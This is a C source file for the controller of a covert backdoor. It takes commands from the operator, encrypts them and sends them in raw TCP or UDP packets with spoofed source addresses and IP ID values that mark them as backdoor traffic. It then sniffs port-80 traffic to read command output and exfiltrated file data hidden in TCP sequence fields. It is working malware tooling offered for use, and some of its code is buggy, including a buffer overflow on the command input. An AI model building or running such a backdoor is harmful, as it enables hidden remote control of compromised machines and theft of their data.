/**
 * client.c
 *
 * USAGE: ./client SOURCE IP DEST IP PROTOCOL
 * to convert to binary
 * host_convert(ipaddress)
 */

#include "client.h"
#include "util.h"

void backdoor_client(uint32 srcip, uint32 destip, char* protocol) {
	client *cln;
	char *cmd;
	pthread_t pth_id;

// Can they run this?
	if (geteuid() != 0) {
		printf(
				"\nYou need to be root to run this.\n\nApplication Terminated!\n\n");
		exit(0);
	}

// Check for correct arguments, and provide them with a usage.
	if ((srcip == 0) && (destip == 0)) {
		perror("Invalid IP Address");
	}

	if ((strcmp(protocol, "TCP") != 0) && (strcmp(protocol, "UDP") != 0)
			&& (strcmp(protocol, "tcp") != 0)
			&& (strcmp(protocol, "udp") != 0)) {
		perror("Invalid Protocol");
	}

	pthread_create(&pth_id, NULL, sniffer_thread, NETWORK_CARD);

	cln = client_new(); // create and initialize a new client struct

// set client structure
	cln->source_host = srcip;
	cln->source_port = CMD_PORT;
	cln->dest_host = destip;
	cln->dest_port = 80;

	//printf("source ip %u, dest ip: %u \n", srcip, destip);

	/**
	 * Print out destination host information
	 */
	//printf("\n\nSending commands to: \n");
	//printf("============================\n\n");
	//printf("Destination : %u:%u\n", cln->dest_host, cln->dest_port);
	//printf("Source : %u:%u\n", cln->source_host, cln->source_port);

	//printf("\n");

// initialize random function
	srand(time(NULL) + getpid());

	cmd = malloc(sizeof(char*));

	while (1) {
		puts("\nEnter a command and hit enter or Ctrl+C to Exit");
		fgets(cmd, 4096, stdin);
		send_packets(cln, cmd, protocol);

//sniffer_thread((void *)"em1");
	}

	pthread_join(pth_id, NULL);
	printf("\nExiting the Controller........\n\n");

//return EXIT_SUCCESS;
}

client *client_new(void) {
	client *c = malloc(sizeof(client));
	c->source_host = 0;
	c->source_port = 0;
	c->dest_host = 0;
	c->dest_port = 0;
	return c;
}

void packet_new(client *c, char *msg, char* protocol) {

	int randomID = 0;

	if ((strcmp(protocol, "TCP") == 0) || (strcmp(protocol, "tcp") == 0)) {
// IP header fields
		packets_tcp.ip.version = 4;
		packets_tcp.ip.ihl = 5;
		packets_tcp.ip.tos = 0;
		packets_tcp.ip.tot_len = 0;
		packets_tcp.ip.id = 0;
		packets_tcp.ip.frag_off = 0;
		packets_tcp.ip.ttl = 64;

		packets_tcp.ip.protocol = IPPROTO_TCP;

		packets_tcp.ip.check = 0;
		packets_tcp.ip.saddr = c->source_host;
		packets_tcp.ip.daddr = c->dest_host;

// initial TCP header fields
		packets_tcp.tcp.source = 0;
		packets_tcp.tcp.dest = 0;
		packets_tcp.tcp.seq = 0;
		packets_tcp.tcp.ack_seq = 0;
		packets_tcp.tcp.doff = 5;
		packets_tcp.tcp.res1 = 0;

		packets_tcp.tcp.fin = 0;
		packets_tcp.tcp.syn = 1;
		packets_tcp.tcp.rst = 0;
		packets_tcp.tcp.psh = 0;
		packets_tcp.tcp.ack = 0;
		packets_tcp.tcp.urg = 0;
		packets_tcp.tcp.res2 = 0;

		packets_tcp.tcp.window = htons(512);
		packets_tcp.tcp.check = 0;
		packets_tcp.tcp.urg_ptr = 0;

// Add the data to the datagram
// encrypt data
		encrypt(SEKRET, msg, sizeof(msg));
		strcpy(packets_tcp.data, msg);

		packets_tcp.tcp.source = htons(c->source_port);

		packets_tcp.tcp.dest = htons(c->dest_port);

		packets_tcp.tcp.seq = 1 + (int) (10000.0 * rand() / (RAND_MAX + 1.0));

// generate random id between 5000 and 5050 used to authenticate backdoor packets
		randomID = randomRange(5000, 5050);
		packets_tcp.ip.id = htons(randomID);

		packets_tcp.ip.tot_len = ((4 * packets_tcp.ip.ihl)
				+ (4 * packets_tcp.tcp.doff) + strlen(packets_tcp.data));

		packets_tcp.ip.check = in_cksum((unsigned short *) &packets_tcp.ip, 20);

// PSEUDO Header fields
		pseudo_header_tcp.source_address = packets_tcp.ip.saddr;
		pseudo_header_tcp.dest_address = packets_tcp.ip.daddr;
		pseudo_header_tcp.placeholder = 0;
		pseudo_header_tcp.protocol = IPPROTO_TCP;
		pseudo_header_tcp.tcp_length = htons(20);

		bcopy((char *) &packets_tcp.tcp, (char *) &pseudo_header_tcp.tcp, 20);
		/* Final checksum on the entire package */
		packets_tcp.tcp.check = in_cksum((unsigned short *) &pseudo_header_tcp,
				32);

	} else if ((strcmp(protocol, "UDP") == 0)
			|| (strcmp(protocol, "udp") == 0)) {

		packets_udp.ip.version = 4;
		packets_udp.ip.ihl = 5;
		packets_udp.ip.tos = 0;
		packets_udp.ip.tot_len = 0;
		packets_udp.ip.id = 0;
		packets_udp.ip.frag_off = htons(0x4000);
		packets_udp.ip.ttl = 64;

		packets_udp.ip.protocol = IPPROTO_UDP;

		packets_udp.ip.check = 0;
		packets_udp.ip.saddr = c->source_host;
		packets_udp.ip.daddr = c->dest_host;

//UDP header fields
		packets_udp.udp.len = 0;
		packets_udp.udp.check = 0;

// Add the data to the datagram encrypt data
		encrypt(SEKRET, msg, sizeof(msg));
		strcpy(packets_udp.data, msg);

		packets_udp.udp.source = htons(c->source_port);

		packets_udp.udp.dest = htons(c->dest_port);

// generate random id between 5000 and 5050 used to authenticate backdoor packets
		randomID = randomRange(5000, 5050);
		packets_udp.ip.id = htons(randomID);

		packets_udp.ip.tot_len = ((4 * packets_udp.ip.ihl)
				+ sizeof(packets_udp.udp) + strlen(packets_udp.data));

		packets_udp.ip.check = in_cksum((unsigned short *) &packets_udp.ip, 20);

		packets_udp.udp.len = htons(sizeof(packets_udp.udp));

// UDP Pseudo header fields
		pseudo_header_udp.source_address = packets_udp.ip.saddr;
		pseudo_header_udp.dest_address = packets_udp.ip.daddr;
		pseudo_header_udp.placeholder = 0;
		pseudo_header_udp.protocol = IPPROTO_UDP;

// or size of UDP_HDR_SZ
		pseudo_header_udp.udp_length = htons(packets_udp.udp.len);

		bcopy((char *) &packets_udp.udp, (char *) &pseudo_header_udp.udp, 20);
		/* Final checksum on the entire package */
		packets_udp.udp.check = in_cksum((unsigned short *) &pseudo_header_udp,
				8);

	}

}

void send_packets(client *c, char *input, char* protocol) {
	int send_socket;
	struct sockaddr_in sin;

	packet_new(c, input, protocol);

	if ((strcmp(protocol, "TCP") == 0) || (strcmp(protocol, "tcp") == 0)) {
		sin.sin_family = AF_INET;
		sin.sin_port = packets_tcp.tcp.dest;
		sin.sin_addr.s_addr = packets_tcp.ip.daddr;

		if ((send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
			error("send_packets(): socket: unable to create a socket.");
		}

		sendto(send_socket, &packets_tcp, packets_tcp.ip.tot_len, 0,
				(struct sockaddr *) &sin, sizeof(sin));
		printf("Sending Command: %s\n", input);

		close(send_socket);

	} else if ((strcmp(protocol, "UDP") == 0)
			|| (strcmp(protocol, "udp") == 0)) {
		sin.sin_family = AF_INET;
		sin.sin_port = packets_udp.udp.dest;
		sin.sin_addr.s_addr = packets_udp.ip.daddr;

		if ((send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
			error("send_packets(): socket: unable to create a socket.");
		}

		sendto(send_socket, &packets_udp, packets_udp.ip.tot_len, 0,
				(struct sockaddr *) &sin, sizeof(sin));
		printf("Sending Command: %s\n", input);

		close(send_socket);
	}

}

/*-------- Checksum Algorithm (Public domain Ping) ----------------------*/
unsigned short in_cksum(unsigned short *addr, int len) {
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;

	/**
	 * Our algorithm is simple, using a 32 bit accumulator (sum), we add
	 * sequential 16 bit words to it, and at the end, fold back all the
	 * carry bits from the top 16 bits into the lower 16 bits.
	 */
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	/* 4mop up an odd byte, if necessary */
	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}

	/* 4add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
	sum += (sum >> 16); /* add carry */
	answer = ~sum; /* truncate to 16 bits */
	return (answer);
}

void *sniffer_thread(void *args) {
	char *device;
	char filter[256] = "";

	device = (char *) args;
	strcpy(filter, "tcp and dst port 80");

	if ((pd = open_pcap_socket(device, filter))) {
		if (pcap_loop(pd, 0, (pcap_handler) parse_response_packet, 0) < 0)
			printf("pcap_loop(): failed: %s\n", pcap_geterr(pd));
	}
	return NULL;
}

pcap_t * open_pcap_socket(char *device, const char *filter) {
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t * pd;
	uint32_t srcip, netmask;
	struct bpf_program bpf;

// open the device for live capture
	if ((pd = pcap_open_live(device, BUFSIZ, 1, 0, errbuf)) == NULL) {
		printf("pcap_open_live(): %s\n", errbuf);
		return NULL;
	}

// get network device source IP address and netmask
	if (pcap_lookupnet(device, &srcip, &netmask, errbuf) < 0) {
		printf("pcap_lookupnet(): %s\n", errbuf);
		return NULL;
	}

// Covert the filter into a packet filter binary
	if (pcap_compile(pd, &bpf, (char *) filter, 0, netmask)) {
		printf("pcap_compile(): %s\n", pcap_geterr(pd));
		return NULL;
	}

	if (pcap_setfilter(pd, &bpf) < 0) {
		printf("pcap_setfilter(): %s\n", pcap_geterr(pd));
		return NULL;
	}

	return pd;

}

void parse_response_packet(u_char *user, struct pcap_pkthdr *packethdr,
		u_char *packet) {
	struct iphdr* iphdr;
	struct tcphdr* tcphdr;
	int size_tcp, password;

	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
	tcphdr = (struct tcphdr*) (packet + sizeof(struct ether_header)
			+ sizeof(struct iphdr));

	size_tcp = tcphdr->doff * 4;

	if (size_tcp < 20) {
		error("parse_response_packet(): INVALID TCP HEADER SIZE\n");
	}

	password = ntohs(iphdr->id) - DEF_IP_ID;

	if ((password >= 5000) && (password <= 5050)) {

		int sourcePort = ntohs(tcphdr->source);

		if (sourcePort == RSP_PORT) {
			fprintf(stdout, "%c", tcphdr->seq);
		} else if (sourcePort == XFL_PORT) {
			writeToFile(tcphdr->seq);
		}

	}
}
